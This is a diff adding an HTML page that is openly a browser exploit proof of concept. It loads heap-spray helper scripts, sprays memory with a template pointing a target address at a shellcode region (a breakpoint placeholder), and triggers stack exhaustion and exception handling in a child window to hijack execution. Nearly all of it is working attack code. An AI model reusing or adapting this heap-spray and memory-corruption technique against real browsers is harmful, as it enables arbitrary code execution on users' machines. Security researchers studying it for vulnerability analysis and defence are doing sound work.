@@ -1,0 +1,42 @@
+<!doctype html>
+<script src="String.js"></script>
+<script src="sprayHeap.js"></script>
+<script>
+  function stackOverflowHighOnStack() {
+    stackOverflowHighOnStack.apply(0, new Array(0x2000));
+  }
+  function attack(pTarget) {
+    var axArgs = [];
+    while (axArgs.length < 0x200) axArgs.push((pTarget - 0x69C) >>> 1);
+    exceptionLowOnStackWithSpray();
+    function exceptionLowOnStackWithSpray() {
+      try {
+        (function(){}).apply(0, axArgs);
+      } catch (e) {
+        throw 0;
+      }
+      exceptionLowOnStackWithSpray.apply(0, axArgs);
+    }
+  }
+  var pSprayStartAddress          = 0x09000000;
+  var dHeapSprayTemplate = {};
+  var pTarget                     = 0x28000201;
+  var pShellcode                  = 0x28000300;
+  dHeapSprayTemplate[pTarget]     = pShellcode;
+  dHeapSprayTemplate[pShellcode]  = 0xCCCCCCCC;
+  window.sHeapSprayBlock = createSprayBlock(dHeapSprayTemplate);
+  window.uHeapSprayBlockCount = getSprayBlockCount(dHeapSprayTemplate, pSprayStartAddress);
+  var oWindow = window.open("about:blank");
+  function prepare() {
+    window.asHeapSpray = new Array(opener.uHeapSprayBlockCount);
+    for (var i = 0; i < opener.uHeapSprayBlockCount; i++) {
+      asHeapSpray[i] = (opener.sHeapSprayBlock + "A").substr(0, opener.sHeapSprayBlock.length);
+    }
+  }
+  oWindow.eval("(" + prepare + ")();");
+  try {
+    String(oWindow.eval("({toString:" + stackOverflowHighOnStack + "})"));
+  } catch(e) {
+    oWindow.eval("(" + attack + ")(" + pTarget + ")");
+  }
+</script>
